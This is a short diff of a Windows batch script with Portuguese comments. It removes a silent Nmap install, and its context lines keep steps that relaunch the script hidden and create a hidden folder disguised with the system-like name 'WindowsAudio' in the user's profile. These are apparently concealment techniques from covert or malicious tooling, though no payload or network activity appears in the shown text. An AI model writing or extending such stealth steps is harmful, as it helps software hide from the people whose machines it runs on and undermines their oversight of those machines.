@@ -5,13 +5,6 @@ if not "%1"=="hidden" (
     exit
 )
 
-:: Instalar Nmap
-echo [*] Instalando Nmap...
-winget install Insecure.Nmap --silent --accept-package-agreements --accept-source-agreements > nul 2>&1
-
-:: Atualizar PATH com o Nmap
-set "PATH=%PATH%;%ProgramFiles(x86)%\Nmap"
-
 :: Criar pasta oculta
 mkdir "%USERPROFILE%\WindowsAudio" > nul 2>&1
 attrib +h "%USERPROFILE%\WindowsAudio" > nul 2>&1
